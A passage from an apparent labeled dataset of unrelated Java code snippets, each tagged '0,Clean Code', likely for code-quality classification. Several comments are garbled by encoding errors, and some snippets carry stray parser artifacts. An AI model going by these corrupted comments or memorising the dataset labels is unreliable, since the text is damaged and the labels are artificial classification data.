case AccessibilityNodeInfo.ACTION_SCROLL_FORWARD:
{
      if (pagesFlipped ? scrollLeft() : scrollRight()) {
        return true;
      }
    }
  break;
case AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD:
{
  if (pagesFlipped ? scrollRight() : scrollLeft()) {
    return true;
  }
}
break;
case android.R.id.accessibilityActionPageRight:
{
if (!mIsRtl) {
return scrollRight();
}
 else {
return scrollLeft();
}
}
case android.R.id.accessibilityActionPageLeft:
{
if (!mIsRtl) {
return scrollLeft();
}
 else {
return scrollRight();
}
}
}
return false;
}
",0,Clean Code
"@Override public Long hset(String key,String field,String value){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.hset(key,field,value);
  }
 }
@Override public Long hset(String key,Map<String,String> hash){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.hset(key,hash);
  }
 }
",0,Clean Code
"public void toggleAllTabs(boolean show){
  if (show == showAllChatsTab)   return;
  showAllChatsTab=show;
  ArrayList<MessagesController.DialogFilter> filters=AccountInstance.getInstance(UserConfig.selectedAccount).getMessagesController().dialogFilters;
  removeTabs();
  for (int a=0, N=filters.size(); a < N; a++) {
    MessagesController.DialogFilter dialogFilter=filters.get(a);
    if (filters.get(a).isDefault()) {
      if (showAllChatsTab)       addTab(a,0,LocaleController.getString(""FilterAllChats"",R.string.FilterAllChats),true,false);
    }
 else {
switch (NekoConfig.tabsTitleType.Int()) {
case NekoXConfig.TITLE_TYPE_TEXT:
        addTab(a,filters.get(a).localId,dialogFilter.name,false,false);
      break;
case NekoXConfig.TITLE_TYPE_ICON:
    addTab(a,filters.get(a).localId,dialogFilter.emoticon != null ? dialogFilter.emoticon : ""馃搨"",false,false);
  break;
case NekoXConfig.TITLE_TYPE_MIX:
addTab(a,filters.get(a).localId,dialogFilter.emoticon != null ? dialogFilter.emoticon + "" "" + dialogFilter.name : ""馃搨 "" + dialogFilter.name,false,false);
break;
}
}
}
finishAddingTabs(true);
}",0,Clean Code
"public static ArchiveData parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ArchiveData(),data).checkInitialized();
}
public static ArchiveData parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ArchiveData(),input).checkInitialized();
}
public static ArchiveData parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ArchiveData(),input).checkInitialized();
}
",0,Clean Code
"@Override public StageComment saveStageComment(StageCommentSaveBO saveBO){
  StageComment stageComment=BeanUtil.copyProperties(saveBO,StageComment.class);
  stageComment.setCommentId(BaseUtil.getNextId());
  stageComment.setCreateUserId(UserUtil.getUserId());
  stageComment.setCreateTime(DateUtil.date());
  save(stageComment);
  return stageComment;
}
",0,Clean Code
"/** 
 * Adds the for generator variable to the frame descriptor. <p>Returns  {@code -1} if a for-generator variable already exists with this name.
 */
public int pushForGeneratorVariableContext(ParameterContext ctx){
  var variable=Identifier.localProperty(ctx.typedIdentifier().Identifier().getText());
  if (forGeneratorVariables.contains(variable)) {
    return -1;
  }
  var slot=frameDescriptorBuilder.addSlot(FrameSlotKind.Illegal,variable,FOR_GENERATOR_VARIABLE);
  forGeneratorVariables.addLast(variable);
  return slot;
}",0,Clean Code
"public void freeze(boolean freeze){
  final boolean wasFrozen=frozen;
  this.frozen=freeze;
  if (wasFrozen && !freeze) {
    if (currentPage == 0) {
      if (emojiAdapter != null) {
        emojiAdapter.notifyDataSetChanged();
      }
    }
 else     if (currentPage == 1) {
      if (gifAdapter != null) {
        gifAdapter.notifyDataSetChanged();
      }
    }
 else     if (currentPage == 2) {
      if (stickersGridAdapter != null) {
        stickersGridAdapter.notifyDataSetChanged();
      }
    }
  }
}",0,Clean Code
"String getImgDayMode();
",0,Clean Code
"/** 
 * Data types supported by the database
 * @param request
 * @return
 */
@GetMapping(""/type_list"") public ListResult<Type> types(@Valid TypeQueryRequest request){
  TypeQueryParam typeQueryParam=TypeQueryParam.builder().dataSourceId(request.getDataSourceId()).build();
  List<Type> types=tableService.queryTypes(typeQueryParam);
  return ListResult.of(types);
}
",0,Clean Code
"@Override protected void before(MethodHookParam param) throws Throwable {
  XposedHelpers.callMethod(XposedHelpers.findClassIfExists(""miui.os.Build"",lpparam.classLoader),""isTablet"",true);
  XposedHelpers.setStaticBooleanField(XposedHelpers.findClassIfExists(""miui.os.Build"",lpparam.classLoader),""IS_TABLET"",true);
}
",0,Clean Code
"public void setLastFlushTime(long lastFlushTime){
  this.lastFlushTime=lastFlushTime;
}
",0,Clean Code
"/** 
 * 鐧藉悕鍗曞悗缃鐞�
 */
private void initAfterProcessorWhiteList(){
  RequestMappingHandlerMapping mapping=applicationContext.getBean(RequestMappingHandlerMapping.class);
  Map<RequestMappingInfo,HandlerMethod> methodMap=mapping.getHandlerMethods();
  methodMap.forEach((key,value) -> {
    if (null != AnnotationUtil.getAnnotation(value.getMethod(),AuthIgnore.class)) {
      if (key.getPatternsCondition() != null) {
        Set<String> urls=key.getPatternsCondition().getPatterns();
        whiteList.addAll(urls);
      }
    }
  }
);
  String contentPath=env.getProperty(SpringUtil.SERVLET_CONTEXT_PATH);
  if (CollUtil.isEmpty(whiteList)) {
    this.whiteList=new ArrayList<>();
  }
  whiteList.addAll(AuthConstant.DEFAULT_WHITE_LIST);
  this.whiteList=this.whiteList.stream().map(whiteUrl -> Optional.ofNullable(contentPath).orElse("""") + whiteUrl).collect(Collectors.toList());
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)114);
    output.writeMessageNoTag(storyBuffInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.storyBuffInfo,storyBuffInfo);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * @return output of the task
 */
public String getOutput(){
  return output;
}
",0,Clean Code
"public boolean hidePopup(boolean byBackButton){
  return hidePopup(byBackButton,false);
}
public boolean hidePopup(boolean byBackButton,boolean forceAnimate){
  if (isPopupShowing()) {
    if (currentPopupContentType == POPUP_CONTENT_BOT_KEYBOARD && botReplyMarkup != null && byBackButton && botButtonsMessageObject != null) {
      if (botReplyMarkup.is_persistent) {
        return false;
      }
      MessagesController.getMainSettings(currentAccount).edit().putInt(""closed_botkeyboard_"" + getTopicKeyString(),botButtonsMessageObject.getId()).apply();
    }
    if (byBackButton && searchingType != 0 || forceAnimate) {
      setSearchingTypeInternal(0,true);
      if (emojiView != null) {
        emojiView.closeSearch(true);
      }
      if (messageEditText != null) {
        messageEditText.requestFocus();
      }
      setStickersExpanded(false,true,false);
      if (emojiTabOpen) {
        checkSendButton(true);
      }
    }
 else {
      if (searchingType != 0) {
        setSearchingTypeInternal(0,false);
        emojiView.closeSearch(false);
        if (messageEditText != null) {
          messageEditText.requestFocus();
        }
      }
 else       if (stickersExpanded) {
        setStickersExpanded(false,true,false);
      }
 else {
        showPopup(0,0);
      }
    }
    return true;
  }
  return false;
}",0,Clean Code
"/** 
 * @return factory for creating ReEnterLastElementStageCsReq messages
 */
public static MessageFactory<ReEnterLastElementStageCsReq> getFactory(){
  return ReEnterLastElementStageCsReqFactory.INSTANCE;
}
",0,Clean Code
"private void setAvatar(){
  if (avatarImage == null) {
    return;
  }
  TLRPC.Chat chat=getMessagesController().getChat(chatId);
  if (chat == null) {
    return;
  }
  currentChat=chat;
  boolean hasPhoto;
  if (currentChat.photo != null) {
    avatar=currentChat.photo.photo_small;
    ImageLocation location=ImageLocation.getForUserOrChat(currentChat,ImageLocation.TYPE_SMALL);
    avatarImage.setForUserOrChat(currentChat,avatarDrawable);
    hasPhoto=location != null;
  }
 else {
    avatarImage.setImageDrawable(avatarDrawable);
    hasPhoto=false;
  }
  if (setAvatarCell != null) {
    if (hasPhoto || imageUpdater.isUploadingImage()) {
      setAvatarCell.setTextAndIcon(LocaleController.getString(""ChatSetNewPhoto"",R.string.ChatSetNewPhoto),R.drawable.baseline_image_24,true);
    }
 else {
      setAvatarCell.setTextAndIcon(LocaleController.getString(""ChatSetPhotoOrVideo"",R.string.ChatSetPhotoOrVideo),R.drawable.baseline_image_24,true);
    }
    if (cameraDrawable == null) {
      cameraDrawable=new RLottieDrawable(R.raw.camera_outline,"""" + R.raw.camera_outline,AndroidUtilities.dp(50),AndroidUtilities.dp(50),false,null);
    }
    setAvatarCell.imageView.setTranslationY(-AndroidUtilities.dp(9));
    setAvatarCell.imageView.setTranslationX(-AndroidUtilities.dp(8));
    setAvatarCell.imageView.setAnimation(cameraDrawable);
  }
  if (PhotoViewer.hasInstance() && PhotoViewer.getInstance().isVisible()) {
    PhotoViewer.getInstance().checkCurrentImageVisibility();
  }
}",0,Clean Code
"/** 
 * Maps a BasicDBObject to a Spring AI Document
 * @param basicDBObject the basicDBObject to map to a spring ai document
 * @return the spring ai document
 */
@SuppressWarnings(""unchecked"") private Document mapBasicDbObject(BasicDBObject basicDBObject){
  String id=basicDBObject.getString(ID_FIELD_NAME);
  String content=basicDBObject.getString(CONTENT_FIELD_NAME);
  Map<String,Object> metadata=(Map<String,Object>)basicDBObject.get(METADATA_FIELD_NAME);
  List<Double> embedding=(List<Double>)basicDBObject.get(this.config.pathName);
  Document document=new Document(id,content,metadata);
  document.setEmbedding(embedding);
  return document;
}
",0,Clean Code
"@Override public String getJoinSign(){
  return this.mInfo.getJoinSign();
}
",0,Clean Code
"/** 
 * <code>optional uint32 MODAPIGJNNJ = 5;</code>
 * @return this
 */
public PlayerRecordInfo clearMODAPIGJNNJ(){
  bitField0_&=~0x00000008;
  mODAPIGJNNJ=0;
  return this;
}",0,Clean Code
"/** 
 * Set the bit at a given index to provided value (1 or 0). 
 */
public static void setBit(MemoryBuffer bitmapBuffer,int baseOffset,int index,int value){
  final int byteIndex=baseOffset + (index >> 3);
  final int bitIndex=index & 7;
  byte current=bitmapBuffer.getByte(byteIndex);
  final byte bitMask=(byte)(1L << bitIndex);
  if (value != 0) {
    current|=bitMask;
  }
 else {
    current-=(bitMask & current);
  }
  bitmapBuffer.putByte(byteIndex,current);
}",0,Clean Code
"public ClassLoader getClassLoader(){
  return classLoader;
}
",0,Clean Code
"/** 
 * Tracking the size of local region, mainly for stack out of bound checking.
 * @param dst
 * @param kSet
 */
private void updateLocalSize(Varnode dst,KSet kSet){
  if (!(dst.isRegister() && dst.getOffset() == GlobalState.arch.getSpIndex())) {
    return;
  }
  if (isCallInstruction) {
    return;
  }
  if (!kSet.isNormal()) {
    return;
  }
  for (  AbsVal absVal : kSet) {
    if (!absVal.getRegion().isLocal() || absVal.isBigVal()) {
      continue;
    }
    long newSize=Math.abs(absVal.getOffset());
    Local local=(Local)absVal.getRegion();
    if (local.getSize() == Local.DEFAULT_SIZE) {
      if (newSize > 0 && newSize < Local.DEFAULT_SIZE) {
        local.setSize(newSize);
        Logging.debug(""Update Local size for "" + local + "" to:""+ newSize);
      }
    }
 else {
      if (newSize > local.getSize() && newSize <= Local.DEFAULT_SIZE) {
        local.setSize(newSize);
        Logging.debug(""Update Local size for "" + local + "" to:""+ newSize);
      }
    }
  }
}",0,Clean Code
"@NonNull @Override public Dialog onCreateDialog(@Nullable Bundle savedInstanceState){
  FragmentActivity activity=requireActivity();
  mKeyType=requireArguments().getString(EXTRA_KEY_TYPE,CryptoUtils.MODE_RSA);
  View view=View.inflate(activity,R.layout.dialog_certificate_generator,null);
  MaterialSpinner keySizeSpinner=view.findViewById(R.id.key_size_selector_spinner);
  if (mKeyType.equals(CryptoUtils.MODE_RSA)) {
    mKeySize=2048;
    keySizeSpinner.setAdapter(new SelectedArrayAdapter<>(activity,androidx.appcompat.R.layout.support_simple_spinner_dropdown_item,SUPPORTED_RSA_KEY_SIZES));
    keySizeSpinner.setOnItemClickListener((parent,view1,position,id) -> mKeySize=SUPPORTED_RSA_KEY_SIZES.get(position));
  }
 else {
    keySizeSpinner.setVisibility(View.GONE);
  }
  EditText expiryDate=view.findViewById(R.id.expiry_date);
  expiryDate.setKeyListener(null);
  expiryDate.setOnFocusChangeListener((v,hasFocus) -> {
    if (v.isInTouchMode() && hasFocus) {
      v.performClick();
    }
  }
);
  expiryDate.setOnClickListener(v -> pickExpiryDate(expiryDate));
  EditText commonName=view.findViewById(R.id.common_name);
  EditText orgUnit=view.findViewById(R.id.organization_unit);
  EditText orgName=view.findViewById(R.id.organization_name);
  EditText locality=view.findViewById(R.id.locality_name);
  EditText state=view.findViewById(R.id.state_name);
  EditText country=view.findViewById(R.id.country_name);
  AlertDialogBuilder builder=new AlertDialogBuilder(activity,true).setTitle(R.string.generate_key).setView(view).setExitOnButtonPress(false).setPositiveButton(R.string.generate_key,(dialog,which) -> ThreadUtils.postOnBackgroundThread(() -> {
    AtomicReference<KeyPair> keyPair=new AtomicReference<>(null);
    String formattedSubject=getFormattedSubject(commonName.getText().toString(),orgUnit.getText().toString(),orgName.getText().toString(),locality.getText().toString(),state.getText().toString(),country.getText().toString());
    if (mExpiryDate == 0) {
      ThreadUtils.postOnMainThread(() -> UIUtils.displayShortToast(R.string.expiry_date_cannot_be_empty));
      return;
    }
    if (formattedSubject.isEmpty()) {
      formattedSubject=""CN=App Manager"";
    }
    try {
      if (mKeyType.equals(CryptoUtils.MODE_RSA)) {
        keyPair.set(KeyStoreUtils.generateRSAKeyPair(formattedSubject,mKeySize,mExpiryDate));
      }
 else       if (mKeyType.equals(CryptoUtils.MODE_ECC)) {
        keyPair.set(KeyStoreUtils.generateECCKeyPair(formattedSubject,mExpiryDate));
      }
    }
 catch (    Exception e) {
      Log.e(TAG,e);
    }
 finally {
      ThreadUtils.postOnMainThread(() -> {
        if (mListener != null)         mListener.onGenerate(keyPair.get());
        ExUtils.exceptionAsIgnored(dialog::dismiss);
      }
);
    }
  }
)).setNegativeButton(R.string.cancel,null);
  return builder.create();
}",0,Clean Code
"static MistralAiTool toMistralAiTool(ToolSpecification toolSpecification){
  MistralAiFunction function=MistralAiFunction.builder().name(toolSpecification.name()).description(toolSpecification.description()).parameters(toMistralAiParameters(toolSpecification.parameters())).build();
  return MistralAiTool.from(function);
}
",0,Clean Code
"@UserMessage(fromResource=""chefs-prompt-is-empty.txt"") Recipe createRecipeWithEmptyResource(String... ingredients);
",0,Clean Code
"public WorkerConfiguration(int defaultPollingInterval){
  this.defaultPollingInterval=defaultPollingInterval;
}
public WorkerConfiguration(){
}
",0,Clean Code
"@Override public ActionResult convert(Throwable exception){
  return ActionResult.fail(""common.paramError"",exception.getMessage(),ExceptionUtils.getErrorInfoFromException(exception));
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)40);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)104);
    output.writeUInt32NoTag(gachaType);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)26);
    output.writeMessageNoTag(gachaCeiling);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.gachaType,gachaType);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.gachaCeiling,gachaCeiling);
  }
  output.endObject();
}",0,Clean Code
"@Override public IStateAction<CNodeDraggedLeftState<NodeType,EdgeType>> createNodeDraggedLeftAction(){
  return new CombinedNodeDraggedLeftAction<>();
}
",0,Clean Code
"/** 
 * Call the Web API
 * @param args Request parameters of method name,{""--method"", ""admin_query_topic_info""} as an example
 */
@Override public boolean processParams(String[] args) throws Exception {
  CommandLine cli=parser.parse(options,args);
  if (cli == null) {
    throw new ParseException(""Parse args failure"");
  }
  if (cli.hasOption(CliArgDef.VERSION.longOpt)) {
    version();
  }
  if (cli.hasOption(CliArgDef.HELP.longOpt)) {
    help();
  }
  String masterAddr=defMasterPortal;
  if (cli.hasOption(CliArgDef.MASTERPORTAL.longOpt)) {
    masterAddr=cli.getOptionValue(CliArgDef.MASTERPORTAL.longOpt);
    if (TStringUtils.isBlank(masterAddr)) {
      throw new Exception(CliArgDef.MASTERPORTAL.longOpt + "" is required!"");
    }
  }
  JsonObject result=null;
  String masterUrl=""http://"" + masterAddr + ""/webapi.htm"";
  if (cli.hasOption(CliArgDef.ADMINMETHOD.longOpt)) {
    Map<String,String> inParamMap=new HashMap<>();
    inParamMap.put(CliArgDef.METHOD.longOpt,""admin_get_methods"");
    result=HttpUtils.requestWebService(masterUrl,inParamMap);
    System.out.println(formatResult(result));
    System.exit(0);
  }
  String methodStr=cli.getOptionValue(CliArgDef.METHOD.longOpt);
  if (TStringUtils.isBlank(methodStr)) {
    throw new Exception(CliArgDef.METHOD.longOpt + "" is required!"");
  }
  requestParams.put(CliArgDef.METHOD.longOpt,methodStr);
  Map<String,String> convertedRequestParams=convertRequestParams(requestParams);
  result=HttpUtils.requestWebService(masterUrl,convertedRequestParams);
  String formattedResult=formatResult(result);
  System.out.println(formattedResult);
  return true;
}",0,Clean Code
"public CassandraEventHandlerDAO(Session session,ObjectMapper objectMapper,CassandraProperties properties,Statements statements){
  super(session,objectMapper,properties);
  insertEventHandlerStatement=session.prepare(statements.getInsertEventHandlerStatement()).setConsistencyLevel(properties.getWriteConsistencyLevel());
  selectAllEventHandlersStatement=session.prepare(statements.getSelectAllEventHandlersStatement()).setConsistencyLevel(properties.getReadConsistencyLevel());
  deleteEventHandlerStatement=session.prepare(statements.getDeleteEventHandlerStatement()).setConsistencyLevel(properties.getWriteConsistencyLevel());
}
",0,Clean Code
"private RealIDInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private RealIDInfoProto(){
  name_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@590222b0",0,Clean Code
"@Override public List<AbstractTable> getTables(){
  return null;
}
",0,Clean Code
"@Specialization(rewriteOn=FrameSlotTypeException.class) protected double evalFloat(VirtualFrame frame) throws FrameSlotTypeException {
  return getCapturedFrame(frame).getDouble(slot);
}
",0,Clean Code
"public static boolean recordFarmGame(){
  return getConfig().recordFarmGame;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o) {
    return true;
  }
  if (!(o instanceof TLSConfig)) {
    return false;
  }
  TLSConfig tlsConfig=(TLSConfig)o;
  if (tlsEnable != tlsConfig.tlsEnable) {
    return false;
  }
  if (tlsPort != tlsConfig.tlsPort) {
    return false;
  }
  if (tlsTwoWayAuthEnable != tlsConfig.tlsTwoWayAuthEnable) {
    return false;
  }
  if (!tlsTrustStorePath.equals(tlsConfig.tlsTrustStorePath)) {
    return false;
  }
  if (!tlsTrustStorePassword.equals(tlsConfig.tlsTrustStorePassword)) {
    return false;
  }
  if (!tlsKeyStorePath.equals(tlsConfig.tlsKeyStorePath)) {
    return false;
  }
  return tlsKeyStorePassword.equals(tlsConfig.tlsKeyStorePassword);
}
",0,Clean Code
"public void processUpdate(TLRPC.TL_updatePeerWallpaper update){
  if (update.peer instanceof TLRPC.TL_peerUser) {
    TLRPC.UserFull userFull=getMessagesController().getUserFull(update.peer.user_id);
    if (userFull != null) {
      if (wallpaperEquals(userFull.wallpaper,update.wallpaper)) {
        return;
      }
      final long dialogId=userFull.id;
      if ((update.flags & 1) != 0) {
        userFull.wallpaper_overridden=update.wallpaper_overridden;
        userFull.wallpaper=update.wallpaper;
        userFull.flags|=16777216;
      }
 else {
        userFull.wallpaper_overridden=false;
        userFull.wallpaper=null;
        userFull.flags&=~16777216;
      }
      getMessagesStorage().updateUserInfo(userFull,false);
      saveChatWallpaper(dialogId,userFull.wallpaper);
      AndroidUtilities.runOnUIThread(() -> {
        NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.userInfoDidLoad,dialogId,userFull);
      }
);
    }
  }
 else {
    TLRPC.ChatFull chatFull=getMessagesController().getChatFull(-DialogObject.getPeerDialogId(update.peer));
    if (chatFull != null) {
      if (wallpaperEquals(chatFull.wallpaper,update.wallpaper)) {
        return;
      }
      final long dialogId=-chatFull.id;
      if ((update.flags & 1) != 0) {
        chatFull.wallpaper=update.wallpaper;
        chatFull.flags2|=128;
      }
 else {
        chatFull.wallpaper=null;
        chatFull.flags2&=~128;
      }
      getMessagesStorage().updateChatInfo(chatFull,false);
      saveChatWallpaper(dialogId,chatFull.wallpaper);
      AndroidUtilities.runOnUIThread(() -> {
        NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.chatInfoDidLoad,chatFull,0,false,false);
      }
);
    }
  }
}",0,Clean Code
"@Override protected void _parse() throws Exception {
  byte[] peeked=read(1);
  assertExpected(peeked,""("");
  this.values=readList();
}",0,Clean Code
"@Bean public Function<MockWeatherService.Request,MockWeatherService.Response> weatherFunctionTwo(){
  MockWeatherService weatherService=new MockWeatherService();
  return (weatherService::apply);
}
",0,Clean Code
"private String getTitle(){
  if (Double.isNaN(matchedPercent)) {
    return ""Basic Blocks"";
  }
  return String.format(""%s %.1f%s"",""Basic Blocks"",matchedPercent,""%"");
}",0,Clean Code
"/** 
 * <code>repeated .RogueMiracle miracle_list = 11;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableMiracleList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RogueMiracleOuterClass.RogueMiracle> getMiracleList(){
  return miracleList;
}",0,Clean Code
"@Deprecated public static UniformType convert(Type type){
  if (type == Type.Int || type == Type.Boolean)   return UniformType.INT;
 else   if (type == Type.Float)   return UniformType.FLOAT;
 else   if (type == VectorType.VEC2)   return UniformType.VEC2;
 else   if (type == VectorType.VEC3)   return UniformType.VEC3;
 else   if (type == VectorType.VEC4)   return UniformType.VEC4;
 else   if (type == VectorType.I_VEC2)   return UniformType.VEC2I;
 else   if (type == VectorType.I_VEC3)   return UniformType.VEC3I;
 else   if (type == MatrixType.MAT4)   return UniformType.MAT4;
 else   throw new IllegalArgumentException(""Unsupported custom uniform type: "" + type);
}",0,Clean Code
"/** 
 * <code>optional .MotionInfo motion = 4;</code>
 * @return whether the motion field is set
 */
public boolean hasMotion(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"/** 
 * Creates a new text content.
 * @param text the text.
 * @return the text content.
 */
public static TextContent from(String text){
  return new TextContent(text);
}
",0,Clean Code
"public GProGuildBannerGameDownloadInfo getBannerGameDownloadeInfo(){
  return this.bannerGameDownloadeInfo;
}
",0,Clean Code
"@Test public void testDelete(){
  workflowResource.delete(""w123"",true);
  verify(mockWorkflowService,times(1)).deleteWorkflow(anyString(),anyBoolean());
}",0,Clean Code
"public int getConfType(){
  return this.confType;
}
",0,Clean Code
"@Override public String toString(){
  return """";
}
",0,Clean Code
"public TempVisit(Long articleId,Long userId){
  this.articleId=articleId;
  this.userId=userId;
}
",0,Clean Code
"@Internal public static void clearDescriptorCache(){
  descCache.cleanUp();
  descCache=CacheBuilder.newBuilder().weakKeys().softValues().concurrencyLevel(64).build();
}",0,Clean Code
"@Override public void close(){
  evaluator.close();
}
",0,Clean Code
"@Bean public StabilityAiApi stabilityAiApi(){
  return new StabilityAiApi(getApiKey());
}
",0,Clean Code
"private static int getOrientation(byte[] jpeg){
  if (jpeg == null) {
    return 0;
  }
  int offset=0;
  int length=0;
  while (offset + 3 < jpeg.length && (jpeg[offset++] & 0xFF) == 0xFF) {
    int marker=jpeg[offset] & 0xFF;
    if (marker == 0xFF) {
      continue;
    }
    offset++;
    if (marker == 0xD8 || marker == 0x01) {
      continue;
    }
    if (marker == 0xD9 || marker == 0xDA) {
      break;
    }
    length=pack(jpeg,offset,2,false);
    if (length < 2 || offset + length > jpeg.length) {
      return 0;
    }
    if (marker == 0xE1 && length >= 8 && pack(jpeg,offset + 2,4,false) == 0x45786966 && pack(jpeg,offset + 6,2,false) == 0) {
      offset+=8;
      length-=8;
      break;
    }
    offset+=length;
    length=0;
  }
  if (length > 8) {
    int tag=pack(jpeg,offset,4,false);
    if (tag != 0x49492A00 && tag != 0x4D4D002A) {
      return 0;
    }
    boolean littleEndian=(tag == 0x49492A00);
    int count=pack(jpeg,offset + 4,4,littleEndian) + 2;
    if (count < 10 || count > length) {
      return 0;
    }
    offset+=count;
    length-=count;
    count=pack(jpeg,offset - 2,2,littleEndian);
    while (count-- > 0 && length >= 12) {
      tag=pack(jpeg,offset,2,littleEndian);
      if (tag == 0x0112) {
        int orientation=pack(jpeg,offset + 8,2,littleEndian);
switch (orientation) {
case 1:
          return 0;
case 3:
        return 180;
case 6:
      return 90;
case 8:
    return 270;
}
return 0;
}
offset+=12;
length-=12;
}
}
return 0;
}",0,Clean Code
"IGProFDLStCommonExt getExtInfo();
",0,Clean Code
"/** 
 * @return factory for creating LineupSlotData messages
 */
public static MessageFactory<LineupSlotData> getFactory(){
  return LineupSlotDataFactory.INSTANCE;
}
",0,Clean Code
"private SparseLinearModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SparseLinearModelProto(){
  dimensions_=com.google.protobuf.LazyStringArrayList.EMPTY;
  weights_=java.util.Collections.emptyList();
  yMean_=emptyDoubleList();
  yNorm_=emptyDoubleList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@74af5823",0,Clean Code
"private void visit(DatabendJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(DatabendConstant constant){
  sb.append(constant.toString());
}
private void visit(DatabendSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
",0,Clean Code
"@Override public ArrayList<IGProAVRoomCtrlOptInfo> getRoomDevOpts(){
  ArrayList<GProAVRoomCtrlOptInfo> roomDevOpts=this.mInfo.getRoomDevOpts();
  ArrayList<IGProAVRoomCtrlOptInfo> arrayList=new ArrayList<>();
  Iterator<GProAVRoomCtrlOptInfo> it=roomDevOpts.iterator();
  while (it.hasNext()) {
    arrayList.add(new GGProAVRoomCtrlOptInfo(it.next()));
  }
  return arrayList;
}
",0,Clean Code
"/** 
 * 鍒ゆ柇jsonschema鐨勫弬鏁版槸鍚︿竴鏍�
 * @param jsonSchema       鏁版嵁搴撲腑鐨勬暟鎹�
 * @param importJsonSchema 瀵煎叆鐨勭敓鎴愮殑jsonschema
 * @return true 涓�鏍� false 涓嶄竴鏍� 涓�鏍风殑璇濆氨涓嶉渶瑕佹洿鏂�
 */
private static boolean jsonSchemaIsSame(JsonSchemaItem jsonSchema,JsonSchemaItem importJsonSchema){
  boolean same=true;
  if (jsonSchema == null && importJsonSchema == null) {
    return true;
  }
  if (jsonSchema != null && !StringUtils.equals(jsonSchema.getType(),importJsonSchema.getType())) {
    return false;
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.OBJECT)) {
    Map<String,JsonSchemaItem> properties=jsonSchema.getProperties();
    Map<String,JsonSchemaItem> importProperties=importJsonSchema.getProperties();
    if (MapUtils.isNotEmpty(properties) || MapUtils.isNotEmpty(importProperties)) {
      List<String> dbJsonKeys=properties.keySet().stream().toList();
      List<String> importJsonKeys=importProperties.keySet().stream().toList();
      if (keysHasDifferent(dbJsonKeys,importJsonKeys)) {
        return false;
      }
      for (      String key : dbJsonKeys) {
        JsonSchemaItem jsonSchemaItem=properties.get(key);
        JsonSchemaItem importJsonSchemaItem=importProperties.get(key);
        if (!jsonSchemaIsSame(jsonSchemaItem,importJsonSchemaItem)) {
          same=false;
          break;
        }
      }
    }
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.ARRAY)) {
    JsonSchemaItem items=jsonSchema.getItems();
    JsonSchemaItem importItems=importJsonSchema.getItems();
    if (items != null && importItems != null) {
      if (!jsonSchemaIsSame(items,importItems)) {
        return false;
      }
    }
  }
  return same;
}
",0,Clean Code
"public int getMaxDataDays(){
  return maxDataDays;
}
",0,Clean Code
"/** 
 * Remove the key/value mapping at the given index.
 * @param index The desired index, must be between 0 and {@link #size()}-1.
 * @return Returns the value that was stored at this index.
 */
public V removeAt(int index){
  final Object old=mArray[(index << 1) + 1];
  if (mSize <= 1) {
    if (DEBUG)     System.out.println(""remove: shrink from "" + mHashes.length + "" to 0"");
    freeArrays(mHashes,mArray,mSize);
    mHashes=EmptyArray.INT;
    mArray=EmptyArray.OBJECT;
    mSize=0;
  }
 else {
    if (mHashes.length > (BASE_SIZE * 2) && mSize < mHashes.length / 3) {
